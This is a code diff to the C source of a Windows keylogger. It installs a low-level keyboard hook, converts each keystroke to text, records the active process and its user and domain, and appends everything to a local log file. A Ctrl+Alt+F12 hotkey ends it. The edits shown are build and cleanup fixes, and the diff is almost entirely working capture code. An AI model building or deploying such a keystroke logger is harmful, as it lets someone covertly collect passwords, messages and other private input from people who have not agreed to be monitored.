@@ -55,8 +55,9 @@ To create a smaller exe file around 5kb, compile with clib.c but this requires l
 #include <Shlwapi.h>
 
 #if !defined (__GNUC__)
-#pragma comment (lib, "advapi32.lib")
-#pragma comment (lib, "shlwapi.lib")
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "user32.lib")
 #endif
 
 HHOOK  hHook;
@@ -76,7 +77,6 @@ void xfree (void *mem) {
 
 void log_txt (char *fmt, ...) 
 {
-  char    *error=NULL;
   va_list arglist;
   char    buffer[2048];
   DWORD   wd;
@@ -137,9 +137,7 @@ BOOL proc2uid (HANDLE hProc, char domain[],
   SID_NAME_USE peUse;
   PTOKEN_USER  pUser;
   BOOL         bResult = FALSE;
-  DWORD        dwTokenSize = 0, 
-               dwUserName = 64, 
-               dwDomain = 64;
+  DWORD        dwTokenSize = 0;
   
   // try open security token
   if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
@@ -175,7 +173,7 @@ void log_exe(void)
   DWORD id;
   char  pname[256];
   DWORD ulen, dlen;
-  char  *cpu, *uid, *dom;
+  char  *uid, *dom;
   char  domain[64], uname[64];
   HANDLE hProc;
   
@@ -252,8 +250,7 @@ LRESULT CALLBACK LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
   {
     // ignore key releases
     if (wParam==WM_SYSKEYUP || 
-        wParam==WM_KEYUP    || 
-        wParam==WM_SYSKEYUP) break;
+        wParam==WM_KEYUP) break;
     
     // ignore left or right shift and capslock
     if (hs->vkCode==VK_LSHIFT ||
@@ -281,9 +278,9 @@ LRESULT CALLBACK LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
       r=ToAscii (hs->vkCode, hs->scanCode, ks, (LPWORD)key, 0);
     }
     if (r==0) {
-      GetKeyNameText(hs->scanCode<<16 | hs->flags<<24, txt, sizeof(txt));
+      GetKeyNameText(hs->scanCode<<16 | hs->flags<<24, (LPSTR)txt, sizeof(txt));
       // enclose in brackets
-      wsprintf (key, "[%s]", txt);
+      wsprintf ((LPSTR)key, "[%s]", txt);
     }
     // replace carriage return with new line
     if (key[0]=='\r') key[0]='\n';
@@ -293,7 +290,7 @@ LRESULT CALLBACK LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
   return CallNextHookEx (hHook, nCode, wParam, lParam);
 }
 
-int WinMain(HINSTANCE hInstance, 
+int APIENTRY WinMain(HINSTANCE hInstance, 
   HINSTANCE hPrevInstance, 
   LPSTR lpCmdLine, 
   int nCmdShow)
@@ -304,7 +301,7 @@ int WinMain(HINSTANCE hInstance,
   
   // register hotkey to terminate
   if (!RegisterHotKey (NULL, id, 
-    MOD_ALT | MOD_CONTROL | MOD_NOREPEAT, VK_F12))
+    MOD_ALT | MOD_CONTROL, VK_F12))
     return 0;
   
   // create / append to log in current directory
